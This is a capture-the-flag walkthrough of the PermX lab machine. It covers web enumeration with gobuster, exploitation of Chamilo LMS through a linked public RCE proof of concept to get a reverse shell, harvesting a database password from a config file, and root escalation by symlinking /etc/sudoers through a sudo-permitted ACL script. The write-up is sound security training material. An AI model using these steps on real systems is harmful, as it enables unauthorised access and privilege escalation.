### Step 1
We are going to start with a scanning port. the ip have open ports to ssh, http and 8080.
let's watch whait is into the web page (to enable the webpage we need to add the ip and url in the file /etc/hosts).
![[Pasted image 20240805103101.png]]
### Step2
On the main pages i don't find somting to use.  Therefore i will use gobuster to enumerate directories.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt dns -u http://permx.htb -x .txt,.php,.html
```

I couldn't find anything useful here either.
![[Pasted image 20240805103908.png]]

### Step3
Another option we have is to search for a subdomain.
```
gobuster vhost --append-domain -u  http://permx.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt | grep -v "Status: 302"
```
Excelent! We find somting. Let's check what is inside.
![[Pasted image 20240805104311.png]]
We have a login page.
![[Pasted image 20240805104529.png]]


### Step 4
With a fast search in internet i found that chamilo have a exploit and we can use the next tool to exploit. 
https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc?tab=readme-ov-file
I do the step to step in the repository and i got a reverse shell.

Let's see what is inside configuration.php
```
www-data@permx:/var/www/chamilo/app/config$ grep -A 10 "Database connection" configuration.php
```

![[Pasted image 20240805115505.png]]
### Step 5
Login in ssh with the password we find. we find the first flag and now let's try scalate privilleges.
![[Pasted image 20240805120434.png]]

The user has a file that can be executed with root privileges, so by analyzing the structure of this file, we can create a symbolic link to modify the permissions in /etc/sudoers.
```
ln -s /etc/sudoers /home/mtz/fake_sudoers
```

After creating the symbolic link, we will execute the ".sh" file, allowing us as the mtz user to modify the contents of the sudoers file.
```
sudo /opt/acl.sh mtz rw /home/mtz/fake_sudoers
```

Now with nano, we can modify the sudoers file; we will add the following rule:
![[Pasted image 20240809105342.png]]
```
mtz ALL=(ALL:ALL) ALL
```

Finally we login as a root and enter the root directory and get the flag.
![[Pasted image 20240809105613.png]]
